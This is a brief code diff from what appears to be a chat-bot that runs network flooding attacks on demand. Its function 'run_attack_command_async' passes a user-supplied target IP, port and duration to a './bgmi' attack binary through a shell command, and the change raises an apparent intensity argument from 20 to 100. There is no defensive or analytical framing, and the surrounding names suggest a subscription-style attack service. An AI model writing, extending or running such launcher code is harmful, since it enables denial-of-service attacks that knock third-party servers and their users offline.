@@ -154,7 +154,7 @@ def extend_and_clean_expired_users():
 
 
 async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} {20} {1000}")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} {100} {1000}")
     await process.communicate()
     
     bot.attack_in_progress = False
